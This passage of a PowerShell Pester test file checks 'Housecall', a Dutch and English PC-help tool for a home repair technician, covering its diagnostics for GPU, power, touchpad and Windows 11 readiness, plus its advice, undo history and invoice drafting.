        (Test-HcHijack ([pscustomobject]@{ Browsers = @(); Policies = @([pscustomobject]@{ Browser = 'Edge'; Names = @('HubsSidebarEnabled', 'ShowMicrosoftRewards', 'ExtensionInstallBlocklist') }) })).FindingId | Should Be 'browserOk'
        Get-HcExtensionName @{ name = 'Coupons' } $null 'abc' | Should Be 'Coupons'
        Get-HcExtensionName @{ name = '__MSG_appName__' } $null 'abc' | Should Be 'abc'
        Get-HcExtensionName $null $null 'abc' | Should Be 'abc'
    }

    It 'counts graphics driver resets once, however often Windows lists them (B7)' {
        $script:Lang = 'en'
        $t = [datetime]'2026-10-06 23:13:28'
        $rep = { param($code, $files, $time, $report) [pscustomobject]@{ Code = $code; Files = $files; Time = $time; Report = $report } }
        $reports = @(
            (& $rep '117' '\\?\C:\WINDOWS\LiveKernelReports\WATCHDOG\WATCHDOG-20261005-2028.dmp' $t 'r1')
            (& $rep '117' '\\?\C:\WINDOWS\LiveKernelReports\WATCHDOG\WATCHDOG-20261005-2028.dmp' $t.AddHours(-3) 'r1')
            (& $rep '1b8' '' $t 'r2')
            (& $rep '1b8' '' $t.AddHours(-5) 'r2')
            (& $rep '193' '\\?\C:\x\WATCHDOG-20261001-1000.dmp' $t 'r3')
        )
        $resets = @(ConvertFrom-HcGpuReports $reports @([datetime]'2026-10-02 12:00:30'))
        $resets.Count | Should Be 3
        $resets[0] | Should Be ([datetime]'2026-10-02 12:00')
        $resets[1] | Should Be ([datetime]'2026-10-05 20:28')
        $resets[2] | Should Be ([datetime]'2026-10-06 18:13')
        Get-HcGpuVendor 'AMD Radeon RX 9060 XT' | Should Be 'AMD'
        Get-HcGpuVendor 'NVIDIA GeForce RTX 4060 Laptop GPU' | Should Be 'NVIDIA'
        Get-HcGpuVendor 'Intel(R) UHD Graphics' | Should Be 'Intel'
        Get-HcGpuVendor 'Microsoft Basic Display Adapter' | Should Be $null
        $now = [datetime]'2026-10-06 23:30'
        $gpu = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ Now = $now; Resets = @(); HardwareErrors = 0; Gpus = @([pscustomobject]@{ Name = 'AMD Radeon RX 9060 XT'; DriverDate = [datetime]'2026-08-17'; Vendor = 'AMD' }); Screens = @(); Background = @() }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcGpu (& $gpu)).FindingId | Should Be 'gpuOk'
        $r = Test-HcGpu (& $gpu @{ Resets = $resets; Screens = @([pscustomobject]@{ Hz = 240 }, [pscustomobject]@{ Hz = 100 }); Background = @('Wallpaper Engine') })
        $r.FindingId | Should Be 'gpuResets'
        $r.FindingArgs[0] | Should Be 3
        @($r.Results | Where-Object { $_.Status -eq 'warn' }).Count | Should Be 2
        @($r.Actions | ForEach-Object { $_.FixId }) -join ',' | Should Be 'openAdvancedDisplay,openGpuDriverSite,openGraphicsSettings'
        (Test-HcGpu (& $gpu @{ Resets = $resets; Gpus = @([pscustomobject]@{ Name = 'NVIDIA GeForce GTX 1060'; DriverDate = [datetime]'2025-01-10'; Vendor = 'NVIDIA' }) })).FindingId | Should Be 'gpuDriverOld'
        (Test-HcGpu (& $gpu @{ Gpus = @([pscustomobject]@{ Name = 'Microsoft Basic Display Adapter'; DriverDate = $null; Vendor = $null }) })).FindingId | Should Be 'gpuNoDriver'
        (Test-HcGpu (& $gpu @{ HardwareErrors = 2 })).FindingId | Should Be 'gpuHardware'
        $r = Test-HcGpu (& $gpu @{ Screens = @([pscustomobject]@{ Hz = 60 }, [pscustomobject]@{ Hz = 60 }) })
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
    }

    It 'reads screen and sleep times from powercfg in any language (B4)' {
        $script:Lang = 'en'
        $q = "Power Scheme GUID: 80950dbe-acee-4ac3-8001-800b8ecf7813  (Ultimate Performance)`n  Minimum Possible Setting: 0x00000000`n  Maximum Possible Setting: 0xffffffff`n  Possible Settings increment: 0x00000001`n  Current AC Power Setting Index: 0x00000384`n  Current DC Power Setting Index: 0x000000b4"
        $t = ConvertFrom-HcPowerQuery $q
        "$($t.Ac) $($t.Dc)" | Should Be '900 180'
        $nl = $q -replace 'Current AC Power Setting Index', 'Index van huidige wisselstroominstelling'
        (ConvertFrom-HcPowerQuery $nl).Ac | Should Be 900
        ConvertFrom-HcPowerQuery 'error' | Should Be $null
        $f = { param($sa, $sd, $pa, $pd, $laptop = $true) [pscustomobject]@{ Laptop = $laptop; Screen = [pscustomobject]@{ Ac = $sa; Dc = $sd }; Sleep = [pscustomobject]@{ Ac = $pa; Dc = $pd } } }
        (Test-HcPowerTimes (& $f 900 300 0 1200)).FindingId | Should Be 'powerTimesOk'
        $r = Test-HcPowerTimes (& $f 60 60 0 1200)
        $r.FindingId | Should Be 'screenOffFast'
        $r.FindingArgs[0] | Should Be '1 min'
        @($r.Actions)[0].FixId | Should Be 'longerTimeouts'
        (Test-HcPowerTimes (& $f 900 300 600 1200)).FindingId | Should Be 'sleepFast'
        # A desktop: only the times on mains count.
        @((Test-HcPowerTimes (& $f 900 60 0 60 $false)).Results).Count | Should Be 2
        Format-HcSeconds 0 | Should Be 'never'
        Format-HcSeconds 45 | Should Be '45 seconds'
        Format-HcSeconds 3600 | Should Be '1 hours'
        Format-HcSeconds 5400 | Should Be '90 min'
    }

    It 'helps make things bigger, finds the touchpad and Windows'' own ads (B5, C5, E5)' {
        $script:Lang = 'en'
        $r = Test-HcReadable ([pscustomobject]@{ TextSize = 100; Scale = 100; Pointer = 1; Magnifier = $false })
        $r.FindingId | Should Be 'readNormal'
        @($r.Actions | ForEach-Object { $_.FixId }) -join ',' | Should Be 'openTextSize,openPointerSize,startMagnifier'
        (Test-HcReadable ([pscustomobject]@{ TextSize = 140; Scale = 100; Pointer = 1; Magnifier = $true })).FindingId | Should Be 'readBigger'
        $pad = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ Laptop = $true; Pads = @([pscustomobject]@{ Name = 'HID-compliant touch pad'; Code = 0; InstanceId = 'HID\X' }); SwitchOff = $false; OffWithMouse = $false; Mice = 1 }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcTouchpad (& $pad)).FindingId | Should Be 'touchpadOk'
        (Test-HcTouchpad (& $pad @{ SwitchOff = $true })).FindingId | Should Be 'touchpadOff'
        (Test-HcTouchpad (& $pad @{ OffWithMouse = $true; Mice = 2 })).FindingId | Should Be 'touchpadOffWithMouse'
        (Test-HcTouchpad (& $pad @{ OffWithMouse = $true; Mice = 1 })).FindingId | Should Be 'touchpadOk'
        $r = Test-HcTouchpad (& $pad @{ Pads = @([pscustomobject]@{ Name = 'Synaptics TouchPad'; Code = 22; InstanceId = 'ACPI\SYN' }) })
        $r.FindingId | Should Be 'touchpadDisabled'
        @($r.Actions)[0].FixId | Should Be 'enableDevice'
        (Test-HcTouchpad (& $pad @{ Pads = @() })).FindingId | Should Be 'touchpadNotFound'
        (Test-HcTouchpad (& $pad @{ Pads = @(); Laptop = $false })).FindingId | Should Be 'touchpadDesktop'
        $tips = { param($onKinds) [pscustomobject]@{ Kinds = @('start', 'tips', 'welcome', 'settings', 'lock', 'finish', 'explorer' | ForEach-Object { [pscustomobject]@{ Kind = $_; On = ($onKinds -contains $_) } }) } }
        $r = Test-HcWindowsTips (& $tips @('lock', 'start'))
        $r.FindingId | Should Be 'windowsTipsOn'
        $r.FindingArgs[0] | Should Be 2
        @($r.Actions)[0].FixId | Should Be 'tipsOff'
        (Test-HcWindowsTips (& $tips @())).FindingId | Should Be 'windowsTipsOff'
        foreach ($lang in 'en', 'nl') {
            foreach ($id in 'readNormal', 'readBigger', 'windowsTipsOn', 'windowsTipsOff', 'touchpadDesktop') {
                foreach ($kind in 'finding', 'advice', 'steps') { "$lang $kind.$id $([bool]$script:Strings[$lang]["$kind.$id"])" | Should Be "$lang $kind.$id True" }
            }
            foreach ($k in $script:HcTipSwitches) { "$lang $($k.Kind) $([bool]$script:Strings[$lang]["cmf.tip.$($k.Kind)"])" | Should Be "$lang $($k.Kind) True" }
        }
    }

    It 'tells whether a Windows 10 PC can move to Windows 11 (E4)' {
        $script:Lang = 'en'
        $pc = { param([hashtable]$c = @{})
            $f = [pscustomobject]@{ Build = 19045; DisplayVersion = '22H2'; Edition = 'Core'; Cpu = 'Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz'; Bits64 = $true
                                    RamGB = 7.8; DiskGB = 238; FreeGB = 95; Uefi = $true; SecureBootOn = $false; Tpm = '2.0'; Verdict = $null; Today = [datetime]'2026-10-06' }
            foreach ($k in $c.Keys) { $f.$k = $c[$k] }
            $f }
        $r = Test-HcWin11 (& $pc)
        $r.FindingId | Should Be 'win11Ready'
        @($r.Actions | ForEach-Object { $_.FixId }) -join ',' | Should Be 'openWindowsUpdate,openWin11Download'
        (@($r.Results | ForEach-Object { $_.Text }) -join ' ') | Should Match '7 more days'
        (Test-HcWin11 (& $pc @{ Cpu = 'Intel(R) Core(TM) i5-6500 CPU @ 3.20GHz' })).FindingId | Should Be 'win11NotPossible'
        $r = Test-HcWin11 (& $pc @{ RamGB = 2 })
        $r.FindingId | Should Be 'win11NotPossible'
        $r.FindingArgs[0] | Should Match 'memory'
        (Test-HcWin11 (& $pc @{ Tpm = 'none' })).FindingId | Should Be 'win11TpmOff'
        (Test-HcWin11 (& $pc @{ Tpm = '1.2' })).FindingId | Should Be 'win11NotPossible'
        (Test-HcWin11 (& $pc @{ Uefi = $false })).FindingId | Should Be 'win11Legacy'
        (Test-HcWin11 (& $pc @{ FreeGB = 12 })).FindingId | Should Be 'win11Space'
        # Secure Boot only has to be possible, not on.
        @((Test-HcWin11 (& $pc)).Results | Where-Object { $_.Status -eq 'problem' }).Count | Should Be 0
        (Test-HcWin11 (& $pc @{ Build = 26100 })).FindingId | Should Be 'win11Already'
        (Test-HcWin11 (& $pc @{ Today = [datetime]'2026-11-01' })).Results[0].Status | Should Be 'problem'
        $r = Test-HcWin11 (& $pc @{ Verdict = [pscustomobject]@{ Release = 'GE25H2'; Result = 'Red'; Reason = 'Tpm UefiSecureBoot' } })
        (@($r.Results | ForEach-Object { $_.Text }) -join ' ') | Should Match 'Tpm UefiSecureBoot'
        # Pc-overzicht's Windows 10 advice now points to E4.
        $script:Areas['E'] -contains 'E4' | Should Be $true
    }

    It 'grows with a big or maximised window, up to 30%' {
        Get-HcZoom 1180 760 | Should Be 1.0
        Get-HcZoom 1600 1000 | Should Be 1.25
        Get-HcZoom 2000 1004 | Should Be 1.255
        Get-HcZoom 3840 2100 | Should Be 1.3
        Get-HcZoom 2560 820 | Should Be 1.025
        Get-HcZoom 0 0 | Should Be 1.0
    }

    It 'has every text of the Start tab, and a one-line summary of the PC' {
        $source = [IO.File]::ReadAllText((Join-Path $root 'src\window-start.ps1'))
        $keys = @([regex]::Matches($source, "T '(start\.[\w.]+)'") | ForEach-Object { $_.Groups[1].Value })
        $keys += @('morning', 'afternoon', 'evening' | ForEach-Object { "start.hello.$_" })
        $keys += @($script:HcStartQuick | ForEach-Object { "start.quick.$_" })
        $keys.Count | Should BeGreaterThan 15
        foreach ($lang in 'en', 'nl') {
            foreach ($key in ($keys | Sort-Object -Unique)) { "$lang $key $([bool]$script:Strings[$lang][$key])" | Should Be "$lang $key True" }
        }
        foreach ($code in $script:HcStartQuick) { @($script:Areas.Values | ForEach-Object { $_ }) -contains $code | Should Be $true }
        $script:Lang = 'nl'
        $f = [pscustomobject]@{ Cpu = 'AMD Ryzen 7 5800X 8-Core Processor'; RamGB = 31.9; SystemDisk = 1; Os = 'Windows 11 Home'; DisplayVersion = '25H2'
                                Disks = @([pscustomobject]@{ Number = 0; SizeGB = 4000; Kind = 'HDD' }, [pscustomobject]@{ Number = 1; SizeGB = 2000; Kind = 'SSD' }) }
        $line = Get-HcStartPcLine $f
        $line | Should Match '^AMD Ryzen 7 5800X 8-Core Processor \(2020\)'
        $line | Should Match '32 GB'
        $line | Should Match '2 TB'
        $line | Should Match 'Windows 11 Home 25H2$'
        Get-HcStartPcLine ([pscustomobject]@{ Disks = @() }) | Should Be ''
        $script:Lang = 'en'
    }

    It 'keeps every change in a history, to undo and do again one by one' {
        $script:HcChanges.Clear(); $script:HcChangeLog.Clear()
        $a = Add-HcChange 'numLockOn' @{} 'Switched NumLock on'
        Start-Sleep -Milliseconds 20
        $b = Add-HcChange 'unmute' @{ Label = 'Speakers' } 'Unmuted Speakers'
        Start-Sleep -Milliseconds 20
        $c = Add-HcChange 'unmute' @{ Label = 'Speakers' } 'Unmuted Speakers'
        $script:HcChanges.Count | Should Be 3
        # The older change of the same thing waits for the later one.
        Test-HcChangeBlocked $b @($script:HcChangeLog) | Should Be $true
        Test-HcChangeBlocked $c @($script:HcChangeLog) | Should Be $false
        Test-HcChangeBlocked $a @($script:HcChangeLog) | Should Be $false
        Set-HcChangeUndone $c
        $c.State | Should Be 'undone'
        $script:HcChanges.Contains($c) | Should Be $false
        $script:HcChangeLog.Count | Should Be 3
        Test-HcChangeBlocked $b @($script:HcChangeLog) | Should Be $false
        # Only active changes reach the note and the invoice.
        (Get-HcVisitChanges) -contains 'Switched NumLock on' | Should Be $true
        @(Get-HcVisitChanges | Where-Object { $_ -eq 'Unmuted Speakers' }).Count | Should Be 1
        Set-HcChangeRedone $c
        $c.State | Should Be 'active'
        $script:HcChanges.Contains($c) | Should Be $true
        # A change from before the history (no State) can still be undone.
        $old = [pscustomobject]@{ FixId = 'numLockOn'; Target = @{}; Label = 'x' }
        [void]$script:HcChanges.Add($old)
        { Set-HcChangeUndone $old } | Should Not Throw
        $script:HcChanges.Clear(); $script:HcChangeLog.Clear()
    }

    It 'finds problems in plain words, Dutch or English' {
        $codes = @($script:Areas.Keys | Where-Object { $_ -ne 'M' } | ForEach-Object { $script:Areas[$_] })
        $first = { param($q) @(Get-HcProblemMatches $q $codes)[0] }
        & $first 'printer' | Should Be 'C1'
        & $first 'Printer doet het niet' | Should Be 'C1'
        & $first 'geen geluid' | Should Be 'B1'
        @(Get-HcProblemMatches 'geen geluid' $codes) -contains 'A1' | Should Be $false
        @(Get-HcProblemMatches 'het doet het niet' $codes).Count | Should Be 0
        & $first 'no sound' | Should Be 'B1'
        & $first 'wifi traag' | Should Be 'A2'
        & $first 'internet' | Should Be 'A1'
        & $first 'anydesk' | Should Be 'F2'
        & $first 'c1' | Should Be 'C1'
        & $first ' A 1 ' | Should Be 'A1'
        & $first 'accu' | Should Be 'C4'
        & $first 'bureaublad' | Should Be 'G1'
        & $first 'e-mail' | Should Be 'A4'
        & $first 'opstarten' | Should Be 'D2'
        & $first 'fotos kwijt' | Should Be 'G2'
        & $first 'back-up' | Should Be 'G4'
        & $first 'tweede scherm' | Should Be 'B6'
        @(Get-HcProblemMatches 'xyzzyq' $codes).Count | Should Be 0
        @(Get-HcProblemMatches '   ' $codes).Count | Should Be 0
        # Every problem of the window has its own words.
        foreach ($c in $codes) { "$c $([bool]$script:HcProblemWords[$c])" | Should Be "$c True" }
    }

    It 'checks everything except what needs an address, and F1/F2 (inside F3)' {
        $codes = Get-HcCheckAllCodes
        foreach ($skip in 'A3', 'A4', 'F1', 'F2', 'M1', 'M5') { $codes -contains $skip | Should Be $false }
        foreach ($code in 'A1', 'C4', 'F3', 'G3') { $codes -contains $code | Should Be $true }
        $codes.Count | Should Be 34
    }

    It 'has every text it shows, in both languages' {
        $source = [IO.File]::ReadAllText((Join-Path $root 'src\window.ps1')) + [IO.File]::ReadAllText((Join-Path $root 'src\window-visit.ps1')) + [IO.File]::ReadAllText((Join-Path $root 'src\window-pc.ps1')) + [IO.File]::ReadAllText((Join-Path $root 'src\window-ai.ps1'))
        $keys = @([regex]::Matches($source, "T '(win\.[\w.]+)'") | ForEach-Object { $_.Groups[1].Value }) +
                @($script:HcTabs | ForEach-Object { "win.tab.$_" }) + @('F1', 'F2', 'F3' | ForEach-Object { "win.safety.$_" })
        $keys.Count | Should BeGreaterThan 20
        foreach ($lang in 'en', 'nl') {
            foreach ($key in ($keys | Sort-Object -Unique)) { $script:Strings[$lang][$key] | Should Not BeNullOrEmpty }
        }
    }

    It 'builds a window that WPF can read' {
        if ([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') { return }
        Add-Type -AssemblyName PresentationFramework
        $window = [Windows.Markup.XamlReader]::Parse((New-HcWindowXaml))
        foreach ($name in 'Tabs', 'Status', 'ProblemsTab', 'SidePanel', 'GroupsPanel', 'ResultPanel', 'ResultScroll', 'OtherTab', 'OtherPanel') {
            $window.FindName($name) | Should Not BeNullOrEmpty
        }
        foreach ($style in 'HcButton', 'HcPrimary', 'HcGroup', 'HcTab', 'HcTabOn', 'HcPill') { $window.FindResource($style) | Should Not BeNullOrEmpty }
        foreach ($theme in $script:HcThemes.Values) { $theme.Keys.Count | Should Be $script:HcThemes['light'].Keys.Count }
    }

    It 'runs a check in the worker, with Housecall loaded there from its own source' {
        $rs = [runspacefactory]::CreateRunspace()
        $rs.Open()
        try {
            $run = { param([hashtable]$p)
                $ps = [powershell]::Create(); $ps.Runspace = $rs
                [void]$ps.AddScript($script:HcWorkerScript)
                foreach ($k in $p.Keys) { [void]$ps.AddParameter($k, $p[$k]) }
                try { @($ps.Invoke()) } finally { $ps.Dispose() } }
            & $run @{ Kind = 'load'; Source = (Get-HcTestSource) } | Out-Null
            $out = & $run @{ Kind = 'check'; Code = 'G1'; Lang = 'nl'; IsAdmin = $false; DryRun = $true }
            $r = Get-HcJobReport $out
            $r.FindingId | Should Not BeNullOrEmpty
            @($r.Results).Count | Should BeGreaterThan 0
        } finally { $rs.Close() }
    }

    It 'turns "choose G2" in advice into buttons, never for the problem on screen' {
        Get-HcMentionedCodes 'Choose G2 to check OneDrive, or A3. G1 is this one; H1 is no problem.' 'G1' | Should Be @('G2', 'A3')
        @(Get-HcMentionedCodes 'Nothing to open here.' 'A1').Count | Should Be 0
    }

    It 'hands the AI''s chosen fixes to Problemen, from the report the AI''s check made' {
        $r = New-HcReport
        Add-HcLine $r problem 'muted'
        Set-HcFinding $r 'micMuted' @('Mic')
        Add-HcAction $r 'restartAudio'
        Add-HcAction $r 'unmute' @{ Label = 'Mic'; Id = 'x' }
        $script:HcWin = @{ Ai = @{ State = [pscustomobject]@{ Answer = [pscustomobject]@{ problem_code = 'B2'; fix_ids = @('unmute') }; Reports = @{ B2 = $r } } } }
        Mock Update-HcTabs { }; Mock Update-HcGroups { }; Mock Update-HcResult { }
        Open-HcAiFixes
        $script:HcWin.Tab | Should Be 'problems'
        $script:HcWin.Code | Should Be 'B2'
        @($script:HcWin.Report.Actions | ForEach-Object { $_.FixId }) | Should Be 'unmute'
        $script:HcWin = $null
    }

    It 'never opens a window in a scripted run, though the window is the default' {
        Mock Show-HcWindow { 'done' }
        Start-Housecall -Lang nl -Answers @('Q') 6>&1 | Out-Null
        Assert-MockCalled Show-HcWindow -Times 0 -Exactly
        Test-HcWindowPossible | Should Be $false
    }
}

Describe 'Pc-overzicht: what this PC is, and the advice' {
    $script:Lang = 'nl'
    $today = [datetime]'2026-09-27'
    # A self-built desktop, as read by Get-HcOverviewFacts.
    $pc = { param([hashtable]$Change = @{})
        $f = [pscustomobject]@{
            Name = 'Zelfbouw-pc (ASUS TUF GAMING B550-PLUS)'; Laptop = $false; Cpu = 'AMD Ryzen 7 5800X 8-Core Processor'; Cores = 8; Gpus = @('AMD Radeon RX 9060 XT')
            RamGB = 31.9; RamType = 'DDR4'; SlotsUsed = 2; SlotsTotal = 4; Os = 'Windows 11 Home'; Edition = 'Core'; DisplayVersion = '25H2'; Build = 26200
            Disks = @([pscustomobject]@{ Number = 0; Name = 'ST4000DM004'; Bus = 'SATA'; Kind = 'HDD'; SizeGB = 4001; Health = 'Healthy' },
                      [pscustomobject]@{ Number = 1; Name = 'CT2000P310SSD8'; Bus = 'NVMe'; Kind = 'SSD'; SizeGB = 2000; Health = 'Healthy' })
            SystemDisk = 1; SystemSizeGB = 1861.9; SystemFreeGB = 1312.7; HasBattery = $false; BatteryHealth = $null
        }
        foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
        $f }
    $ids = { param($f) @(Get-HcOverviewAdvice $f $today | ForEach-Object { $_.Id }) }

    It 'names the PC: brand and model, Lenovo''s readable name, or a self-built PC''s board' {
        Get-HcPcName 'HP' 'HP Pavilion Laptop 15-eg0xxx' '' '' '' | Should Be 'HP Pavilion Laptop 15-eg0xxx'
        Get-HcPcName 'Dell Inc.' 'Inspiron 15 3511' '' '' '' | Should Be 'Dell Inspiron 15 3511'
        Get-HcPcName 'LENOVO' '20L5CTO1WW' 'ThinkPad T480' '' '' | Should Be 'Lenovo ThinkPad T480'
        Get-HcPcName 'ASUS' 'System Product Name' 'System Version' 'ASUSTeK COMPUTER INC.' 'TUF GAMING B550-PLUS' | Should Be 'Zelfbouw-pc (ASUS TUF GAMING B550-PLUS)'
        Get-HcPcName 'To be filled by O.E.M.' 'To be filled by O.E.M.' '' '' 'Default string' | Should Be 'Onbekend model'
    }

    It 'dates a processor by its generation, not the BIOS' {
        Get-HcCpuYear 'AMD Ryzen 7 5800X 8-Core Processor' | Should Be 2020
        Get-HcCpuYear 'Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz' | Should Be 2017
        Get-HcCpuYear 'Intel(R) Core(TM) i7-1065G7 CPU @ 1.30GHz' | Should Be 2019
        Get-HcCpuYear '12th Gen Intel(R) Core(TM) i5-12450H' | Should Be 2021
        Get-HcCpuYear 'Intel(R) Core(TM) i3-4005U CPU @ 1.70GHz' | Should Be 2013
        Get-HcCpuYear 'Intel(R) Core(TM) Ultra 7 155H' | Should Be 2023
        Get-HcCpuYear 'Intel(R) Celeron(R) N4020 CPU @ 1.10GHz' | Should Be 2018
        Get-HcCpuYear 'Intel(R) N100' | Should Be 2023
        Get-HcCpuYear 'AMD A6-9225 RADEON R4' | Should Be $null
    }

    It 'knows which processors Windows 11 takes' {
        Test-HcCpuWin11 'AMD Ryzen 7 5800X 8-Core Processor' | Should Be $true
        Test-HcCpuWin11 'Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz' | Should Be $true
        Test-HcCpuWin11 'Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz' | Should Be $false
        Test-HcCpuWin11 'Intel(R) Core(TM) i3-4005U CPU @ 1.70GHz' | Should Be $false
        Test-HcCpuWin11 'AMD Ryzen 5 1600 Six-Core Processor' | Should Be $false
        Test-HcCpuWin11 'AMD A6-9225 RADEON R4' | Should Be $null
    }

    It 'knows until when Windows gets updates' {
        (Get-HcWindowsSupport 26200 '25H2' 'Core' $today).Status | Should Be 'ok'
        (Get-HcWindowsSupport 26100 '24H2' 'Professional' $today).Status | Should Be 'soon'
        (Get-HcWindowsSupport 22631 '23H2' 'Core' $today).Status | Should Be 'ended'
        $ten = Get-HcWindowsSupport 19045 '22H2' 'Core' $today
        $ten.Major | Should Be 10
        $ten.Esu | Should Be ([datetime]'2026-10-13')
        Get-HcWindowsSupport 26100 '24H2' 'Enterprise' $today | Should Be $null
    }

    It 'tells SSD from HDD, also when Windows says Unspecified' {
        Get-HcDiskKind 'SSD' 'SATA' 0 | Should Be 'SSD'
        Get-HcDiskKind 'Unspecified' 'NVMe' 0 | Should Be 'SSD'
        Get-HcDiskKind 'Unspecified' 'SATA' 5400 | Should Be 'HDD'
        Get-HcDiskKind 'Unspecified' 'SATA' ([uint32]::MaxValue) | Should Be 'unknown'
        Format-HcSize 2000 | Should Be '2 TB'
        Format-HcSize 4001 | Should Be '4 TB'
        Format-HcSize 512 | Should Be '512 GB'
    }

    It 'is happy with Shamil''s PC' {
        & $ids (& $pc) | Should Be 'allGood'
    }

    It 'gives the classic advice for a 2017 laptop on a hard disk with 4 GB' {
        $old = & $pc @{ Laptop = $true; Cpu = 'Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz'; RamGB = 3.9
            Disks = @([pscustomobject]@{ Number = 0; Name = 'WDC WD10SPZX'; Bus = 'SATA'; Kind = 'HDD'; SizeGB = 1000; Health = 'Healthy' })
            SystemDisk = 0; SystemSizeGB = 931; SystemFreeGB = 60; HasBattery = $true; BatteryHealth = 64 }
        & $ids $old | Should Be @('ssd', 'diskFull', 'ramLaptop', 'batteryAging', 'oldPc')
        $a = @(Get-HcOverviewAdvice $old $today)
        ($a | Where-Object { $_.Id -eq 'ramLaptop' }).Args | Should Be @(4, 8)
        ($a | Where-Object { $_.Id -eq 'oldPc' }).Args | Should Be @(2017, 9)
    }

    It 'says a disk in trouble first, and Windows 10 by what the processor allows' {
        $sick = & $pc @{ Disks = @([pscustomobject]@{ Number = 1; Name = 'SSD'; Bus = 'NVMe'; Kind = 'SSD'; SizeGB = 500; Health = 'Warning' }) }
        @(& $ids $sick)[0] | Should Be 'diskHealth'
        & $ids (& $pc @{ Build = 19045; DisplayVersion = '22H2' }) | Should Be 'win11Free'
        $stuck = & $pc @{ Build = 19045; DisplayVersion = '22H2'; Cpu = 'Intel(R) Core(TM) i3-4005U CPU @ 1.70GHz' }
        (& $ids $stuck) -contains 'win10Stuck' | Should Be $true
        @(Get-HcOverviewAdvice $stuck ([datetime]'2026-11-01') | ForEach-Object { $_.Id }) -contains 'win10StuckEnded' | Should Be $true
        & $ids (& $pc @{ DisplayVersion = '24H2'; Build = 26100 }) | Should Be 'winVersionSoon'
    }

    It 'puts picked advice on the note and the invoice' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear(); $script:HcWork.Clear(); $script:HcAdvice.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'D1'; FindingId = 'slowOk'; FindingArgs = @() })
        [void]$script:HcAdvice.Add('Een SSD plaatsen in plaats van de harde schijf: veel sneller opstarten.')
        @(Get-HcNoteBlocks | ForEach-Object { $_.Text }) -contains 'Advies' | Should Be $true
        $fin = New-HcFinishState
        $fin.Minutes = 30
        $texts = @(Get-HcInvoiceLayout (New-HcDraftInvoice $fin ([pscustomobject]@{ start_fee = 15; start_minutes = 30 }) $today) | ForEach-Object { $_ } | ForEach-Object { $_.Text })
        $texts -contains 'Advies' | Should Be $true
        $texts -contains 'Een SSD plaatsen in plaats van de harde schijf: veel sneller opstarten.' | Should Be $true
        $script:HcVisit.Clear(); $script:HcAdvice.Clear()
    }

    It 'has every advice in both languages, each with a title and a short line' {
        foreach ($id in 'diskHealth', 'ssd', 'diskFull', 'ram', 'ramLaptop', 'win11Free', 'win10Stuck', 'win10StuckEnded', 'winVersionSoon', 'winVersionEnded', 'batteryReplace', 'batteryAging', 'oldPc', 'allGood') {
            foreach ($lang in 'en', 'nl') {
                foreach ($key in "adv.$id", "adv.$id.title", "adv.$id.short") { $script:Strings[$lang][$key] | Should Not BeNullOrEmpty }
            }
        }
    }
}

Describe 'The window: Afronden and the history' {
    $script:Lang = 'nl'
    # Settings with no IBAN and no BTW yet.
    $settings = [pscustomobject]@{ business_name = 'Shamil Imanuel'; postcode_city = 'Almere'; email = 'x@example.nl'; iban = $null
        hourly_rate = '20.00'; callout_fee = '0.00'; start_fee = '15.00'; start_minutes = 30; btw_mode = 'unset'; payment_days = 14 }
    $now = [datetime]'2026-09-27 15:00'

    It 'fills the draft invoice as the relay will: starting price, quarters, parts' {
        $fin = New-HcFinishState
        $fin.Minutes = 50; $fin.Name = ' Mevr. de Vries '; $fin.Payment = 'cash'
        [void]$fin.Extras.Add([pscustomobject]@{ Description = 'Draadloze muis'; Amount = [decimal]19.95 })
        $inv = New-HcDraftInvoice $fin $settings $now
        @($inv.lines | ForEach-Object { $_.amount }) | Should Be @(15, 10, 19.95)
        $inv.total | Should Be 44.95
        $inv.client_name | Should Be 'Mevr. de Vries'
        $inv.number | Should Be 'concept'
        $inv.due_date | Should Be '2026-10-11'
        $inv.btw_amount | Should Be 0
    }

    It 'puts the salutation before the name: Dutch has one Mevr., English tells Mrs. from Ms.' {
        Get-HcTitleChoices 'nl' | Should Be @('none', 'mr', 'mrs', 'couple', 'family')
        Get-HcTitleChoices 'en' | Should Be @('none', 'mr', 'mrs', 'ms', 'couple', 'family')
        Format-HcClientName 'mrs' ' Anna de Vries ' 'nl' | Should Be 'Mevr. Anna de Vries'
        Format-HcClientName 'ms' 'Anna de Vries' 'nl' | Should Be 'Mevr. Anna de Vries'
        Format-HcClientName 'couple' 'Jansen' 'nl' | Should Be 'Dhr. en mevr. Jansen'
        Format-HcClientName 'family' 'Smith' 'en' | Should Be 'The Smith family'
        Format-HcClientName 'mr' '' 'nl' | Should Be ''
        Format-HcClientName 'none' 'Jan' 'nl' | Should Be 'Jan'
        $fin = New-HcFinishState
        $fin.Title = 'mrs'; $fin.Name = 'de Vries'; $fin.Minutes = 30
        (New-HcDraftInvoice $fin $settings $now).client_name | Should Be 'Mevr. de Vries'
    }

    It 'draws a betaalbewijs: the amounts and "voldaan", without a number' {
        $fin = New-HcFinishState
        $fin.Minutes = 50; $fin.Payment = 'cash'; $fin.Title = 'mrs'; $fin.Name = 'de Vries'
        $texts = @(Get-HcInvoiceLayout (New-HcDraftInvoice $fin $settings $now) -Receipt | ForEach-Object { $_ } | ForEach-Object { $_.Text })
        $texts -contains 'Betaalbewijs' | Should Be $true
        $texts -contains 'VOOR' | Should Be $true
        $texts -contains 'Mevr. de Vries' | Should Be $true
        @($texts | Where-Object { $_ -match 'concept' }).Count | Should Be 0
        @($texts | Where-Object { $_ -match [char]0x20AC }).Count | Should BeGreaterThan 1
        $texts -contains 'Voldaan op 27 september 2026 (contant).' | Should Be $true
        # Paying later is no receipt, even once there is an IBAN.
        Get-HcPayMethods ([pscustomobject]@{ iban = 'NL00BANK0123456789' }) -Receipt | Should Be @('pin', 'cash', 'tikkie')
    }

    It 'writes the mail in the visit''s language, greeting by salutation' {
        $who = [pscustomobject]@{ business_name = 'Shamil Imanuel'; phone = '06-12345678' }
